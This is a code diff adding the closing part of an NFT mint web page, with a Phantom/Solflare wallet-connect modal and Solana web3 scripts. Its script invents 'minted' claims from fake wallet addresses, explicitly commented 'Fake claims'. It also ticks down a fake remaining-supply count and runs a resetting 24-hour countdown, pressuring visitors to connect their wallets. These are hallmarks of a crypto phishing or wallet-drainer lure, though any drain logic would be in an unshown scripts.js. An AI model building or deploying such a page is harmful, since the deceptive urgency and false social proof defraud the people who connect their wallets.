+    </div>
+</div>
+
+<!-- Wallet Modal -->
+<div id="wallet-modal" class="wallet-modal" style="display: none;">
+    <div class="wallet-modal-overlay"></div>
+    <div class="wallet-modal-content">
+        <div class="wallet-modal-header">
+            <h3>Select Your Wallet</h3>
+            <button class="wallet-modal-close" id="close-modal">&times;</button>
+        </div>
+        <div class="wallet-modal-body">
+            <div class="wallet-options" id="wallet-options">
+                <div class="wallet-option" id="phantom-wallet" data-wallet="phantom">
+                    <div class="wallet-icon">
+                        <img src="https://docs.phantom.com/favicon.svg" alt="Phantom" width="48" height="48" style="border-radius: 12px;">
+                    </div>
+                    <div class="wallet-info">
+                        <div class="wallet-name">Phantom</div>
+                        <div class="wallet-status" id="phantom-status">
+                            <span class="status-dot"></span>
+                            <span class="status-text">Checking...</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="wallet-option" id="solflare-wallet" data-wallet="solflare">
+                    <div class="wallet-icon">
+                        <img src="https://solflare.com/favicon.ico" alt="Solflare" width="48" height="48" style="border-radius: 12px;">
+                    </div>
+                    <div class="wallet-info">
+                        <div class="wallet-name">Solflare</div>
+                        <div class="wallet-status" id="solflare-status">
+                            <span class="status-dot"></span>
+                            <span class="status-text">Checking...</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="wallet-loading-state" id="wallet-loading-state">
+                <div class="wallet-loading-spinner">
+                    <img src="https://docs.phantom.com/favicon.svg" alt="Phantom" style="width: 40px; height: 40px; border-radius: 10px;">
+                </div>
+                <div class="wallet-loading-title">Connecting Wallet</div>
+                <div class="wallet-loading-subtitle">Please connect your wallet to continue.<br>Check your wallet extension for connection requests.</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Generate floating particles
+    function createParticles() {
+        const particlesContainer = document.getElementById('particles');
+        for (let i = 0; i < 50; i++) {
+            const particle = document.createElement('div');
+            particle.classList.add('particle');
+            const size = Math.random() * 4 + 2;
+            particle.style.width = size + 'px';
+            particle.style.height = size + 'px';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDuration = Math.random() * 15 + 10 + 's';
+            particle.style.animationDelay = Math.random() * 10 + 's';
+            particlesContainer.appendChild(particle);
+        }
+    }
+    createParticles();
+
+    // Page Navigation
+    const pages = {
+        mint: 'mint-page',
+        collection: 'collection-page',
+        roadmap: 'roadmap-page',
+        team: 'team-page'
+    };
+
+    function showPage(pageId) {
+        Object.values(pages).forEach(id => {
+            const page = document.getElementById(id);
+            if (page) page.classList.remove('active');
+        });
+        const activePage = document.getElementById(pages[pageId]);
+        if (activePage) activePage.classList.add('active');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    document.querySelectorAll('.nav-btn[data-page]').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const page = btn.getAttribute('data-page');
+            if (pages[page]) showPage(page);
+        });
+    });
+
+    // ✅ زر أعلى الصفحة - نفس وظيفة الزر الأصلي
+    const topConnectBtn = document.getElementById('connect-wallet-top');
+    if (topConnectBtn) {
+        topConnectBtn.addEventListener('click', function() {
+            const originalBtn = document.getElementById('connect-wallet');
+            if (originalBtn) {
+                originalBtn.click();
+            } else {
+                const heroBtn = document.getElementById('connect-wallet-hero');
+                if (heroBtn) heroBtn.click();
+            }
+        });
+    }
+
+    // Countdown Timer
+    let timeLeft = 24 * 60 * 60;
+    const timerInterval = setInterval(() => {
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            document.getElementById('days').innerText = '00';
+            document.getElementById('hours').innerText = '00';
+            document.getElementById('minutes').innerText = '00';
+            document.getElementById('seconds').innerText = '00';
+            return;
+        }
+        timeLeft--;
+        const days = Math.floor(timeLeft / (24 * 60 * 60));
+        const hours = Math.floor((timeLeft % (24 * 60 * 60)) / (60 * 60));
+        const minutes = Math.floor((timeLeft % (60 * 60)) / 60);
+        const seconds = timeLeft % 60;
+        document.getElementById('days').innerText = days.toString().padStart(2, '0');
+        document.getElementById('hours').innerText = hours.toString().padStart(2, '0');
+        document.getElementById('minutes').innerText = minutes.toString().padStart(2, '0');
+        document.getElementById('seconds').innerText = seconds.toString().padStart(2, '0');
+    }, 1000);
+
+    // Fake claims
+    const fakeAddresses = ['9xL1...2mNq', 'Hj9M...3aRf', 'Pq2W...9vXc', 'Mn7T...4kLp', 'Rk3B...6zQw'];
+    const fakeNFTs = ['Genesis', 'Nebula', 'Star', 'Void', 'Galaxy'];
+    
+    setInterval(() => {
+        const claimsList = document.getElementById('claims-list');
+        if (claimsList) {
+            const randomAddress = fakeAddresses[Math.floor(Math.random() * fakeAddresses.length)];
+            const randomNFT = fakeNFTs[Math.floor(Math.random() * fakeNFTs.length)];
+            const randomNumber = Math.floor(Math.random() * 9999) + 1;
+            const newClaim = document.createElement('div');
+            newClaim.className = 'claim-item';
+            newClaim.innerHTML = `<span class="check">✅</span><span class="address">${randomAddress}</span><span class="nft-name">minted ${randomNFT} #${randomNumber}</span>`;
+            claimsList.insertBefore(newClaim, claimsList.firstChild);
+            if (claimsList.children.length > 8) {
+                claimsList.removeChild(claimsList.lastChild);
+            }
+        }
+    }, 15000);
+
+    // Update remaining count
+    setInterval(() => {
+        const remainingEl = document.getElementById('remaining-count');
+        if (remainingEl) {
+            let current = parseInt(remainingEl.innerText);
+            if (current > 1200) {
+                remainingEl.innerText = current - Math.floor(Math.random() * 3) - 1;
+            }
+        }
+    }, 8000);
+</script>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://unpkg.com/@solana/web3.js@1.30.0/lib/index.iife.min.js"></script>
+<script src="scripts.js"></script>
+</body>
+</html>
